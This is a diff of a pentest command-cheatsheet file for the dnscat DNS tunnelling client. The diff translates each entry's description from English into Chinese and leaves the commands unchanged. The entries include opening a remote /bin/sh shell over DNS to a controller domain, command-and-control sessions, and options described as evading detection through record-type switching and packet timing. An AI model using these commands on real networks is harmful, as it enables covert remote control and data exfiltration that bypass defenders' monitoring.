@@ -3,76 +3,66 @@ tags: [network, dns, exfiltration, c2, security, pentest, tunnel]
 
 actions:
 # === BASIC CONNECTIVITY ===
- - title: dnscat - basic command session
+ - title: dnscat - 基本命令会话
    desc: |
-     Establishes a default interactive command session with a dnscat server over DNS. 
-     This mode is the most common way to start a C2 (Command and Control) channel through DNS queries. 
-     It uses the system's default DNS settings to resolve the specified domain and communicate with the listener.
+     通过 DNS 与 dnscat 服务器建立默认的交互式命令会话。
+     此模式是通过 DNS 查询启动 C2（命令与控制）通道的最常见方式，使用系统默认 DNS 设置解析指定域名并与监听器通信。
    command: "dnscat --dns domain={{domain}}"
 
- - title: dnscat - connectivity ping
+ - title: dnscat - 连通性 ping
    desc: |
-     Performs a simple connectivity check to verify if a dnscat server is listening on the target domain. 
-     Use this to troubleshoot connection issues or verify the environment's DNS egress before attempting a full session. 
-     If the server responds, it indicates that DNS traffic is successfully reaching the controller.
+     执行简单的连通性检查，验证 dnscat 服务器是否在目标域名上监听。
+     在尝试完整会话之前，用此排查连接问题或验证环境的 DNS 出口，若服务器响应，说明 DNS 流量已成功到达控制器。
    command: "dnscat --dns domain={{domain}} --ping"
 
 # === SHELLS AND EXECUTION ===
- - title: dnscat - execute process (bind shell)
+ - title: dnscat - 执行进程（绑定 Shell）
    desc: |
-     Executes a specific process on the client and links its input/output to the DNS stream. 
-     This is commonly used to provide a remote shell (like /bin/sh or cmd.exe) to the dnscat server. 
-     Be aware that this exposes the client's command line to the server administrator.
+     在客户端执行特定进程，并将其输入/输出链接到 DNS 流。
+     常用于向 dnscat 服务器提供远程 Shell（如 /bin/sh 或 cmd.exe），请注意这会将客户端命令行暴露给服务器管理员。
    command: "dnscat --dns domain={{domain}} --exec {{process|/bin/sh}}"
 
- - title: dnscat - interactive console mode
+ - title: dnscat - 交互式控制台模式
    desc: |
-     Starts a session where input and output are sent directly to the local console. 
-     This mode is useful for manual data transfer or direct communication between the client and server operators. 
-     It bypasses the default 'command' session logic to provide a raw data stream.
+     启动一个输入和输出直接发送到本地控制台的会话。
+     此模式适合手动数据传输或客户端与服务器操作员之间的直接通信，它绕过默认的命令会话逻辑以提供原始数据流。
    command: "dnscat --dns domain={{domain}} --console"
 
 # === SECURITY AND AUTHENTICATION ===
- - title: dnscat - authenticated session with secret
+ - title: dnscat - 使用密钥的认证会话
    desc: |
-     Sets a shared secret to enable encryption and prevent man-in-the-middle (MITM) attacks. 
-     The same secret must be configured on both the client and the server for the connection to succeed. 
-     This is highly recommended for production or sensitive engagements to ensure session integrity.
+     设置共享密钥以启用加密并防止中间人（MITM）攻击。
+     客户端和服务器必须配置相同的密钥连接才能成功，生产或敏感任务中强烈建议使用以确保会话完整性。
    command: "dnscat --dns domain={{domain}} --secret {{secret_key}}"
 
- - title: dnscat - disable encryption
+ - title: dnscat - 禁用加密
    desc: |
-     Explicitly disables all encryption and authentication for the DNS session. 
-     Use this only for debugging or in environments where the encryption overhead causes significant performance issues. 
-     Note that all transmitted data will be visible in plaintext to anyone monitoring the DNS traffic.
+     显式禁用 DNS 会话的所有加密和认证。
+     仅在调试或加密开销导致严重性能问题的环境中使用，请注意所有传输数据将以明文形式对监控 DNS 流量的任何人可见。
    command: "dnscat --dns domain={{domain}} --no-encryption"
 
 # === NETWORK TUNING ===
- - title: dnscat - custom upstream DNS server
+ - title: dnscat - 自定义上游 DNS 服务器
    desc: |
-     Forces the client to send DNS queries to a specific upstream server instead of the system default. 
-     This is useful when you need to bypass a restrictive local DNS resolver or target a specific internal nameserver. 
-     The server parameter specifies the IP address of the DNS resolver to use for the tunnel.
+     强制客户端将 DNS 查询发送到特定的上游服务器，而非系统默认。
+     当你需要绕过受限的本地 DNS 解析器或指向特定内部域名服务器时非常有用，server 参数指定用于隧道的 DNS 解析器 IP 地址。
    command: "dnscat --dns domain={{domain}},server={{dns_server|8.8.8.8}}"
 
- - title: dnscat - specify DNS record types
+ - title: dnscat - 指定 DNS 记录类型
    desc: |
-     Restricts the tunnel to use specific DNS record types such as TXT, MX, or CNAME. 
-     Different environments may monitor or block certain record types, so switching can help with evasion. 
-     You can provide a single type or a comma-separated list of preferred types.
+     将隧道限制为使用 TXT、MX 或 CNAME 等特定 DNS 记录类型。
+     不同环境可能监控或阻止某些记录类型，切换可帮助规避检测，可提供单一类型或逗号分隔的偏好类型列表。
    command: "dnscat --dns domain={{domain}},type={{record_types|TXT,CNAME,MX}}"
 
- - title: dnscat - stealth and timing control
+ - title: dnscat - 隐蔽与节奏控制
    desc: |
-     Adjusts the delay between packets and forces a steady transmission rate to avoid detection. 
-     Increasing the delay can help bypass basic rate-limiting or anomaly detection systems. 
-     The steady flag ensures the client waits the full delay period even if a response is received immediately.
+     调整数据包之间的延迟并强制稳定的传输速率以避免检测。
+     增大延迟可帮助绕过简单的速率限制或异常检测系统，steady 标志确保客户端即使立即收到响应也会等待完整的延迟周期。
    command: "dnscat --dns domain={{domain}} --delay {{delay_ms|2000}} --steady"
 
 # === DEBUGGING ===
- - title: dnscat - packet trace debugging
+ - title: dnscat - 数据包跟踪调试
    desc: |
-     Enables detailed packet tracing to display every incoming and outgoing dnscat packet. 
-     This is essential for debugging complex network paths or understanding how the protocol is being handled by intermediate firewalls. 
-     It provides a granular view of the hex-encoded data being sent over the DNS protocol.
+     启用详细的数据包跟踪，显示每个传入和传出的 dnscat 数据包。
+     对于调试复杂网络路径或理解中间防火墙如何处理该协议至关重要，可提供通过 DNS 协议发送的十六进制编码数据的细粒度视图。
    command: "dnscat --dns domain={{domain}} --packet-trace"
